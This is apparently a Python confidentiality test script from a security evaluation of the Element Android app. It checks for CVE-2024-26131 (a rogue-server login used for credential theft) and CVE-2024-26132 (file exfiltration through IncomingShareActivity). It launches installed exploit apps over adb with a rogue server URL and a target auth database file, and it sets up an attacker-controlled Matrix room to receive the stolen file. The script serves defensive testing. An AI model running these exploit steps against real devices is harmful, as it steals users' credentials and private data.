#!/usr/bin/env python3
"""
Confidentiality tests for Element Android app
Tests for CVE-2024-26131 rogue server credential theft and CVE-2024-26132 file exfiltration
"""

import json
import os
import subprocess
import sys
import time
from typing import Any, Dict, Tuple

import requests


def run_adb_command(command: str) -> Tuple[bool, str]:
    """Run ADB command and return (success, output) tuple"""
    try:
        result = subprocess.run(
            f"adb {command}", shell=True, capture_output=True, text=True, timeout=30
        )
        return result.returncode == 0, result.stdout.strip()
    except subprocess.TimeoutExpired:
        return False, "TIMEOUT"
    except Exception as e:
        return False, f"ERROR: {str(e)}"


def test_rogue_server_credential_theft() -> Dict[str, Any]:
    """
    Test CVE-2024-26131: Rogue server login for credential theft

    This test attempts to exploit Element's intent redirection vulnerability to force
    LoginActivity to display a login screen configured with an attacker-controlled
    Matrix server, enabling credential harvesting attacks.
    """
    element_pkg = "im.vector.app"
    attacker_pkg = "com.example.elementexploit"
    attacker_activity = "com.example.elementexploit.MainActivity"
    rogue_server_url = "http://10.0.2.2:8000"

    try:
        # Check if Element is installed (release or debug variant)
        success, output = run_adb_command("shell pm list packages | grep im.vector.app")
        if not success or "im.vector.app" not in output:
            return {
                "success": False,
                "message": "Element not installed - cannot test rogue server attack",
            }

        # Determine which variant is installed
        if "im.vector.app.debug" in output:
            element_pkg = "im.vector.app.debug"

        # Check if malicious exploit app is installed
        success, output = run_adb_command(
            f"shell pm list packages | grep {attacker_pkg}"
        )

        if not success or attacker_pkg not in output:
            # No malicious app = baseline mode, confidentiality secure
            return {
                "success": False,
                "message": "Confidentiality secure - no exploit app available for rogue server attack",
            }

        # Malicious app is installed - try to exploit rogue server credential theft
        # Clear logcat to capture fresh exploit activity
        run_adb_command("logcat -c")

        # Launch the exploit with rogue_server mode
        success, output = run_adb_command(
            f"shell am start -n {attacker_pkg}/{attacker_activity} "
            f"--es exploit_type rogue_server --es rogue_server_url {rogue_server_url}"
        )

        if not success:
            return {
                "success": False,
                "message": "Failed to launch exploit app - rogue server test inconclusive",
            }

        # Wait for exploit to execute
        time.sleep(3)

        # Check if Element was launched (indicates rogue server exploit triggered)
        success, element_pid = run_adb_command(f"shell pidof {element_pkg}")

        if success and element_pid:
            # Element is running - rogue server exploit likely succeeded
            return {
                "success": True,
                "message": f"Rogue server exploit successful - Element LoginActivity launched with attacker server config (credentials would be sent to {rogue_server_url})",
                "exploited": True,
            }

        # Element not running - check logcat for exploit evidence
        success, logcat = run_adb_command("logcat -d -s ElementExploit:D")

        if success and "ROGUE SERVER" in logcat:
            return {
                "success": True,
                "message": f"Rogue server exploit executed - confidentiality breach (credentials sent to {rogue_server_url})",
                "exploited": True,
            }

        # No clear evidence of successful exploit
        return {
            "success": False,
            "message": "Rogue server exploit did not succeed - confidentiality protected",
        }

    except Exception as e:
        return {
            "success": False,
            "message": f"Rogue server test failed: {e}",
        }


def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
    """
    Test CVE-2024-26132: File exfiltration via IncomingShareActivity + FileProvider

    This test only runs for vuln_scenario_2 which has the elementexfiltrate app.
    For vuln_scenario_0/1 with elementexploit app, this test is skipped.

    This test does its own room setup internally:
    1. Checks if elementexfiltrate app is installed (vuln_scenario_2 only)
    2. Creates attacker-controlled room as Bob
    3. Invites Alice and has her join
    4. Launches file exfiltration exploit
    5. Checks for evidence
    """
    element_pkg = "im.vector.app"
    attacker_pkg = (
        "com.example.elementexfiltrate"  # Different app for file exfiltration
    )
    attacker_activity = "com.example.elementexfiltrate.MainActivity"

    # Matrix server configuration
    matrix_server = os.getenv("MATRIX_SERVER", "http://localhost:8008")
    bob_user = os.getenv("BOB_USER", "bob")
    bob_pass = os.getenv("BOB_PASS", "bobpass123")
    alice_user = os.getenv("ALICE_USER", "alice")
    alice_pass = os.getenv("ALICE_PASS", "alicepass123")
    alice_user_id = f"@{alice_user}:localhost"
    target_file = os.getenv("TARGET_FILE", "matrix-sdk-auth.realm")

    try:
        # Check if Element is installed
        success, output = run_adb_command("shell pm list packages | grep im.vector.app")
        if not success or "im.vector.app" not in output:
            return {
                "success": False,
                "message": "Element not installed - cannot test file exfiltration",
            }

        # Determine which variant is installed
        if "im.vector.app.debug" in output:
            element_pkg = "im.vector.app.debug"

        # Check if file exfiltration malicious app is installed (vuln_scenario_2 only)
        success, output = run_adb_command(
            f"shell pm list packages | grep {attacker_pkg}"
        )

        if not success or attacker_pkg not in output:
            # No file exfiltration app = not vuln_scenario_2, skip test
            return {
                "success": False,
                "message": "Confidentiality secure - no file exfiltration exploit app available (vuln_scenario_2 only)",
            }

        # File exfiltration app is installed - this is vuln_scenario_2
        # Create attacker-controlled room for file exfiltration
        print(
            "[DEBUG] Creating attacker-controlled room for file exfiltration...",
            file=sys.stderr,
        )

        # Step 1: Login as Bob (attacker)
        try:
            bob_login_response = requests.post(
                f"{matrix_server}/_matrix/client/v3/login",
                json={
                    "type": "m.login.password",
                    "user": bob_user,
                    "password": bob_pass,
                },
                timeout=10,
            )
            bob_token = bob_login_response.json().get("access_token")

            if not bob_token:
                print(
                    "[DEBUG] Failed to login as Bob - Matrix server may not be available",
                    file=sys.stderr,
                )
                return {
                    "success": False,
                    "message": "File exfiltration test skipped - Matrix server not available for room creation",
                }
        except Exception as e:
            print(f"[DEBUG] Matrix server connection failed: {e}", file=sys.stderr)
            return {
                "success": False,
                "message": f"File exfiltration test skipped - Matrix server error: {e}",
            }

        # Step 2: Create exfiltration room as Bob
        try:
            create_room_response = requests.post(
                f"{matrix_server}/_matrix/client/v3/createRoom",
                headers={"Authorization": f"Bearer {bob_token}"},
                json={
                    "name": "Exfiltrated Data Drop",
                    "preset": "private_chat",
                    "visibility": "private",
                    "topic": "CVE-2024-26132 File Exfiltration Test",
                },
                timeout=10,
            )
            room_id = create_room_response.json().get("room_id")

            if not room_id:
                return {
                    "success": False,
                    "message": "File exfiltration test failed - could not create room",
                }

            print(f"[DEBUG] Created exfiltration room: {room_id}", file=sys.stderr)
        except Exception as e:
            return {
                "success": False,
                "message": f"File exfiltration test failed - room creation error: {e}",
            }

        # Step 3: Invite Alice to the room
        try:
            requests.post(
                f"{matrix_server}/_matrix/client/v3/rooms/{room_id}/invite",
                headers={"Authorization": f"Bearer {bob_token}"},
                json={"user_id": alice_user_id},
                timeout=10,
            )
            print("[DEBUG] Invited Alice to the room", file=sys.stderr)
            time.sleep(1)
        except Exception as e:
            print(f"[DEBUG] Failed to invite Alice: {e}", file=sys.stderr)

        # Step 4: Login as Alice and join the room
        try:
            alice_login_response = requests.post(
                f"{matrix_server}/_matrix/client/v3/login",
                json={
                    "type": "m.login.password",
                    "user": alice_user,
                    "password": alice_pass,
                },
                timeout=10,
            )
            alice_token = alice_login_response.json().get("access_token")

            if alice_token:
                # Alice joins the room
                requests.post(
                    f"{matrix_server}/_matrix/client/v3/rooms/{room_id}/join",
                    headers={"Authorization": f"Bearer {alice_token}"},
                    json={},
                    timeout=10,
                )
                print(f"[DEBUG] Alice joined room {room_id}", file=sys.stderr)

                # Send confirmation message
                requests.post(
                    f"{matrix_server}/_matrix/client/v3/rooms/{room_id}/send/m.room.message",
                    headers={"Authorization": f"Bearer {alice_token}"},
                    json={
                        "msgtype": "m.text",
                        "body": "Alice joined the room - CVE-2024-26132 attack setup complete",
                    },
                    timeout=10,
                )

                # Give Element time to sync
                time.sleep(2)
        except Exception as e:
            print(f"[DEBUG] Alice join process error: {e}", file=sys.stderr)

        # Step 5: Launch the file exfiltration exploit
        print(
            f"[DEBUG] Launching file exfiltration exploit targeting room {room_id}...",
            file=sys.stderr,
        )
        run_adb_command("logcat -c")

        success, output = run_adb_command(
            f"shell am start -n {attacker_pkg}/{attacker_activity} "
            f"--es room_id {room_id} --es target_file {target_file}"
        )

        if not success:
            return {
                "success": False,
                "message": "Failed to launch file exfiltration exploit app",
            }

        # Wait for exploit to execute
        time.sleep(3)

        # Step 6: Check for evidence of file exfiltration
        # Check if Element was launched
        success, element_pid = run_adb_command(f"shell pidof {element_pkg}")

        if success and element_pid:
            return {
                "success": True,
                "message": f"File exfiltration exploit successful - Element IncomingShareActivity launched to exfiltrate {target_file} to room {room_id}",
                "exploited": True,
            }

        # Check logcat for exploit evidence
        success, logcat = run_adb_command("logcat -d -s ElementExfiltrate:D")

        if success and "FILE EXFILTRATION" in logcat:
            return {
                "success": True,
                "message": f"File exfiltration exploit executed - confidentiality breach (file sent to room {room_id})",
                "exploited": True,
            }

        # No clear evidence of successful exploit
        return {
            "success": False,
            "message": "File exfiltration exploit did not succeed - confidentiality protected",
        }

    except Exception as e:
        return {
            "success": False,
            "message": f"File exfiltration test failed: {e}",
        }


def run_confidentiality_tests() -> Dict[str, Any]:
    """Run all confidentiality tests and return comprehensive results"""
    results = {}
    overall_success = True

    # Test file exfiltration (CVE-2024-26132) first
    file_exfiltration_result = test_file_exfiltration_cve_2024_26132()
    results["file_exfiltration"] = file_exfiltration_result

    if file_exfiltration_result["success"]:
        overall_success = False
        print(
            f"[FAIL] File exfiltration: {file_exfiltration_result['message']}",
            file=sys.stderr,
        )
    else:
        print(
            f"[PASS] File exfiltration: {file_exfiltration_result['message']}",
            file=sys.stderr,
        )

    # Wait 2 seconds before next test
    time.sleep(2)

    # Test rogue server credential theft (CVE-2024-26131) second
    rogue_server_result = test_rogue_server_credential_theft()
    results["rogue_server_credential_theft"] = rogue_server_result

    if rogue_server_result["success"]:
        overall_success = False
        print(
            f"[FAIL] Rogue server credential theft: {rogue_server_result['message']}",
            file=sys.stderr,
        )
    else:
        print(
            f"[PASS] Rogue server credential theft: {rogue_server_result['message']}",
            file=sys.stderr,
        )

    results["overall_success"] = overall_success
    return results


def main():
    try:
        results = run_confidentiality_tests()

        # Create summary matching Element's expected format
        # Note: success=True means vulnerability detected, so we invert for scoring
        summary = {
            "rogue_server_credential_theft": (
                0 if results["rogue_server_credential_theft"]["success"] else 1
            ),
            "file_exfiltration": 0 if results["file_exfiltration"]["success"] else 1,
        }

        # Add overall score (1 if all tests pass, 0 if any fail)
        summary["score"] = 1 if results["overall_success"] else 0

        # Output JSON results
        print(json.dumps(summary))

    except Exception as e:
        print(f"Error running confidentiality tests: {e}", file=sys.stderr)
        error_result = {"score": 0, "error": str(e)}
        print(json.dumps(error_result))
        sys.exit(1)


if __name__ == "__main__":
    main()
